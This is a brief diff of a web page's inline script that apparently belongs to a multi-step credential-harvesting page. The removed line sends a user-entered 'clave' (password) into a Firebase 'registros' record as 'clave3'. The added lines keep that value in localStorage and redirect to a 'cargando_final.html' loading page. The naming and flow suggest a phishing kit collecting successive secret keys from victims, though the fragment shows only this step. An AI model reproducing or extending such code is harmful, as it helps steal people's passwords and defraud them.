@@ -104,11 +104,11 @@
       db.ref("registros").limitToLast(1).once("value", snap => {
         const key = Object.keys(snap.val() || {})[0];
         if (key) {
-          db.ref("registros/" + key + "/clave3").set(clave);
+          localStorage.setItem("clave3_input", clave);
         }
       });
 
-      window.location.href = "final.html";
+      window.location.href = "cargando_final.html";
     }
   </script>
 </body>
